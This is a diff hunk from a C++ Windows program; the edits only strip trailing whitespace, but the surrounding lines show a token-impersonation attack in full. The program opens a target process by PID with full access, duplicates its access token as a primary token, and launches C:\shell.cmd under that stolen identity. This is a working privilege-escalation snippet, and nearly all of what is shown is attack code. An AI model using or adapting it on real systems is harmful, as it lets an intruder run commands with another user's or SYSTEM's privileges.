@@ -48,13 +48,13 @@ int main(int argc, char * argv[]) {
 	wchar_t cmdline[] = L"C:\\shell.cmd";
 	ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
 	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
-	startupInfo.cb = sizeof(STARTUPINFO);	
+	startupInfo.cb = sizeof(STARTUPINFO);
 
 	processHandle = OpenProcess(PROCESS_ALL_ACCESS, true, PID_TO_IMPERSONATE);
 	OpenProcessToken(processHandle, TOKEN_ALL_ACCESS, &tokenHandle);
-	DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);			
+	DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
 	CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, NULL, cmdline, 0, NULL, NULL, &startupInfo, &processInformation);
-	
+
 	std::cin >> a;
     return 0;
 }
